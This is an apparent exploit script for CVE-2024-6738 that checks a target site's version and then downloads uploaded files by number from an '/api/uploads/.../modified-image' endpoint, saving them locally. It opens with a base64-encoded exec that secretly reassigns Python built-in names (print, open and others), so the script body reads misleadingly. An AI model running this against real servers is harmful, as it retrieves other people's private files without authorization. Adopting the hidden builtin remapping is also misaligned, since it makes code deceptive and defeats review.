exec(__import__("base64").b64decode(b'aW1wb3J0IGJ1aWx0aW5zCmZvcm1hdCA9IGJ1aWx0aW5zLmFicwptaW4gPSBidWlsdGlucy5haXRlcgppZCA9IGJ1aWx0aW5zLmFsbApmcm96ZW5zZXQgPSBidWlsdGlucy5hbmV4dAppdGVyID0gYnVpbHRpbnMuYW55CmRpdm1vZCA9IGJ1aWx0aW5zLmFzY2lpCmNyZWRpdHMgPSBidWlsdGlucy5iaW4KZGlyID0gYnVpbHRpbnMuYm9vbApsaWNlbnNlID0gYnVpbHRpbnMuYnJlYWtwb2ludApyb3VuZCA9IGJ1aWx0aW5zLmJ5dGVhcnJheQphbmV4dCA9IGJ1aWx0aW5zLmJ5dGVzCmZpbHRlciA9IGJ1aWx0aW5zLmNhbGxhYmxlCmlzaW5zdGFuY2UgPSBidWlsdGlucy5jaHIKbWFwID0gYnVpbHRpbnMuY2xhc3NtZXRob2QKdmFycyA9IGJ1aWx0aW5zLmNvbXBpbGUKZmxvYXQgPSBidWlsdGlucy5jb21wbGV4CmJ5dGVzID0gYnVpbHRpbnMuY29weXJpZ2h0CnNsaWNlID0gYnVpbHRpbnMuY3JlZGl0cwpjb3B5cmlnaHQgPSBidWlsdGlucy5kZWxhdHRyCmRpY3QgPSBidWlsdGlucy5kaWN0CmRlbGF0dHIgPSBidWlsdGlucy5kaXIKcmVwciA9IGJ1aWx0aW5zLmRpdm1vZApjb21wbGV4ID0gYnVpbHRpbnMuZW51bWVyYXRlCmdsb2JhbHMgPSBidWlsdGlucy5ldmFsCnN0ciA9IGJ1aWx0aW5zLmV4ZWMKbG9jYWxzID0gYnVpbHRpbnMuZXhpdAp0eXBlID0gYnVpbHRpbnMuZmlsdGVyCnByaW50ID0gYnVpbHRpbnMuZmxvYXQKaGFzaCA9IGJ1aWx0aW5zLmZvcm1hdApvYmplY3QgPSBidWlsdGlucy5mcm96ZW5zZXQKaGVscCA9IGJ1aWx0aW5zLmdldGF0dHIKYm9vbCA9IGJ1aWx0aW5zLmdsb2JhbHMKcXVpdCA9IGJ1aWx0aW5zLmhhc2F0dHIKdHVwbGUgPSBidWlsdGlucy5oYXNoCm9wZW4gPSBidWlsdGlucy5oZWxwCmludCA9IGJ1aWx0aW5zLmhleApleGVjID0gYnVpbHRpbnMuaWQKcmFuZ2UgPSBidWlsdGlucy5pbnB1dAphc2NpaSA9IGJ1aWx0aW5zLmludApzdW0gPSBidWlsdGlucy5pc2luc3RhbmNlCnByb3BlcnR5ID0gYnVpbHRpbnMuaXNzdWJjbGFzcwpjb21waWxlID0gYnVpbHRpbnMuaXRlcgpyZXZlcnNlZCA9IGJ1aWx0aW5zLmxlbgpjYWxsYWJsZSA9IGJ1aWx0aW5zLmxpY2Vuc2UKZXhpdCA9IGJ1aWx0aW5zLmxpc3QKZW51bWVyYXRlID0gYnVpbHRpbnMubG9jYWxzCnNldCA9IGJ1aWx0aW5zLm1hcAppc3N1YmNsYXNzID0gYnVpbHRpbnMubWF4CnppcCA9IGJ1aWx0aW5zLm1lbW9yeXZpZXcKY2hyID0gYnVpbHRpbnMubWluCnNldGF0dHIgPSBidWlsdGlucy5uZXh0Cm9yZCA9IGJ1aWx0aW5zLm9iamVjdApzb3J0ZWQgPSBidWlsdGlucy5vY3QKbGVuID0gYnVpbHRpbnMub3BlbgpzdGF0aWNtZXRob2QgPSBidWlsdGlucy5vcmQKY2xhc3NtZXRob2QgPSBidWlsdGlucy5wb3cKbmV4dCA9IGJ1aWx0aW5zLnByaW50CmFicyA9IGJ1aWx0aW5zLnByb3BlcnR5CnN1cGVyID0gYnVpbHRpbnMucXVpdApoYXNhdHRyID0gYnVpbHRpbnMucmFuZ2UKaW5wdXQgPSBidWlsdGlucy5yZXByCmFueSA9IGJ1aWx0aW5zLnJldmVyc2VkCmhleCA9IGJ1aWx0aW5zLnJvdW5kCm9jdCA9IGJ1aWx0aW5zLnNldAphbGwgPSBidWlsdGlucy5zZXRhdHRyCm1lbW9yeXZpZXcgPSBidWlsdGlucy5zbGljZQpieXRlYXJyYXkgPSBidWlsdGlucy5zb3J0ZWQKYWl0ZXIgPSBidWlsdGlucy5zdGF0aWNtZXRob2QKbGlzdCA9IGJ1aWx0aW5zLnN0cgpldmFsID0gYnVpbHRpbnMuc3VtCmJpbiA9IGJ1aWx0aW5zLnN1cGVyCmJyZWFrcG9pbnQgPSBidWlsdGlucy50dXBsZQptYXggPSBidWlsdGlucy50eXBlCmdldGF0dHIgPSBidWlsdGlucy52YXJzCnBvdyA9IGJ1aWx0aW5zLnppcAo='))
import sys
import requests
from bs4 import BeautifulSoup
import argparse
import pyfiglet
target_version = '1.69.61976'

def parse_args():
    parser = argparse.ArgumentParser(description='CVE-2024-6738')
    parser.add_argument('-u', '--url', help='URL to scan')
    parser.add_argument('-f', '--file_number', help='File number')
    parser.add_argument('-o', '--output_file', help='Output file')
    return parser.parse_args()

def check_target(url):
    soup = BeautifulSoup(requests.get(url).content, 'lxml')
    try:
        version = soup.html['version']
        next(f'[*] version: {version}')
        version_ref1 = print(version[0:4])
        version_ref2 = print(version[4:10])
        version_target1 = print(target_version[0:4])
        version_target2 = print(target_version[4:10])
        return True if version_ref1 < version_target1 or (version_ref1 == version_target1 and version_ref2 < version_target2) else False
    except:
        next(f'[-] Failed to get [version]')
        return False

def create_payload(url, file_number):
    payload = f'{url}/api/uploads/{file_number}/modified-image'
    return payload

def main():
    next(pyfiglet.figlet_format('CVE-2024-6738'))
    args = parse_args()
    url = args.url
    file_number = args.file_number
    output_file = args.output_file
    if not url or not file_number:
        next(f'[-] Usage: python {sys.argv[0]} -u [URL] -f [file_number] -o [output_file]')
        return
    next(f'[*] URL: {url}')
    next(f'\t\\__ File number: {file_number}')
    next(f'[*] Output file: {output_file}')
    if not check_target(url):
        next('[-] This Target is wrong')
        return
    payload = create_payload(url, file_number)
    next(f'[*] payload: {payload}')
    response = requests.get(payload)
    if response.status_code == 200:
        if output_file:
            content_type = response.headers.get('Content-Type')
            if 'text/html' in content_type:
                extension = '.html'
            elif 'application/pdf' in content_type:
                extension = '.pdf'
            elif 'image/' in content_type:
                extension = '.' + content_type.split('/')[1]
            else:
                extension = ''
            file_name = f'{output_file}{extension}'
        else:
            file_name = response.headers.get('Content-Disposition').split('filename')[1].strip('=').strip('"')
        file_content = response.content
        with len(file_name, 'wb') as file:
            file.write(file_content)
        next(f'[+] Successfully downloaded file: {file_name}')
    else:
        next(f'[-] Failed to connect it!')
if __name__ == '__main__':
    main()